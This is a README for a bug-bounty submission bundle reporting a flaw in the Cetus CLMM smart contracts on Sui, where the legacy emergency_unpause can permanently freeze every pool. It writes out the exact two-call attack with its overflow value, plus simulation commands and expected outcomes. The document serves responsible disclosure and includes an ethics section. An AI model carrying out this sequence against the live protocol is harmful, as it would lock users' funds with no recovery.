================================================================================
 F1 — Cetus CLMM: permanent protocol freeze via the legacy emergency_unpause
 Submission bundle
================================================================================

WHAT IS HERE
------------
  F1-audit-report.md     the finding (source of truth: Audit/finding-F1-*.md)
  F1-audit-report.html   same report, printable to PDF (A4)
  poc/                   Move unit test — the primary artefact, no keys needed
  exploits/              PTB builder + simulator (dry-run by default)
  evidence/              the two code versions side by side, with line numbers

THE BUG IN ONE PARAGRAPH
------------------------
`config::emergency_unpause` writes a caller-chosen u64 into
`GlobalConfig.package_version`. That field is the protocol kill switch: all 27
gated entry points in `pool.move` start with `checked_package_version`, i.e.
`assert!(VERSION >= config.package_version)`. v15 (PR #6, merged 2026-04-30)
added an upper bound, `version <= package_version()` == 15 — but the bound only
exists inside the v15 package. Sui packages are immutable, the emergency
functions are deliberately not version-gated, and the v14 package is still
callable, where the same function asserts only `version >= before_version` and
then writes the value as-is. Any value >= 2^63 - 1 is unrecoverable:
`update_package_version` requires `version > old && version < 2^63`, and the
emergency path is bounded below by the recorded `before_version`. Result: every
pool frozen forever, no admin repair, no upgrade path.

TWO CALLS, NO CAPITAL (see exploits/)
-------------------------------------
  [0] <PKG_V14>::config::emergency_pause(GlobalConfig)
  [1] <PKG_V14>::config::emergency_unpause(GlobalConfig, 9223372036854775807)

Both target the OLD package on purpose. In v14 the ACL bit for both functions is
bit 5 — the very bit v15 renamed to ACL_EMERGENCY_UNPAUSE and documents as
"unpause-only, cannot pause". PRECONDITION: the signer holds ACL bit 5.
No flash loan, no capital, no user interaction. If the protocol is already
paused, call [1] alone is enough.

HOW TO VERIFY, CHEAPEST FIRST
-----------------------------
  cd packages/cetus_clmm && sui move test emergency_unpause_legacy_bypass
      -> 4 tests: v15 rejects the write; the legacy-equivalent write freezes
         remove_liquidity; neither AdminCap nor pause/unpause can repair it.

  export RPC_URL=... CONFIG=... PKG_LEGACY=...
  npx tsx exploits/f1_emergency_unpause_brick.ts        # simulate, sends nothing
  ./exploits/verify_f1.sh                               # read-only checks

WHAT SUCCESS LOOKS LIKE
-----------------------
  simulation of [0]+[1] against legacy package .... success
  GlobalConfig.package_version .................... 9223372036854775807
  pool::remove_liquidity / close_position / swap .. abort 10 (EPackageVersionDeprecate)
  config::update_package_version(cap, 15) ......... abort 16 (EInvalidPackageVersion)
  emergency_pause + emergency_unpause(15) ......... abort 16 (EInvalidPackageVersion)
  the same write via the v15 package .............. abort 16 (the cap, and only there)

BOUNTY ELIGIBILITY (report section 9, short version)
----------------------------------------------------
Probably NOT payable as a Critical: it needs an existing ACL role and it freezes
rather than steals, so a strict "unprivileged third party, no preconditions"
scope excludes it. It is still worth submitting because (a) v15 explicitly
re-classifies bit 5 as a LIMITED role, so the precondition is not "admin can do
admin things"; (b) the impact is 100% of TVL, permanently, with no recovery;
(c) it is a bypass of a mitigation shipped specifically to prevent it.
Expected modal outcome: "acknowledged / out of scope for reward". The open lead
that would make it unambiguously Critical is a historical package (v1..v13, not
published in this repository) that guards emergency_pause with a more widely
granted role bit — see section 9 of the report.

ETHICS
------
This is a denial-of-service primitive that freezes other people's funds with no
recovery path. The scripts default to dry-run and refuse to submit unless
CONFIRM_I_AM_AUTHORIZED=yes. Use them on localnet/testnet, or on mainnet only
with written authorisation from the target protocol under its disclosure policy.
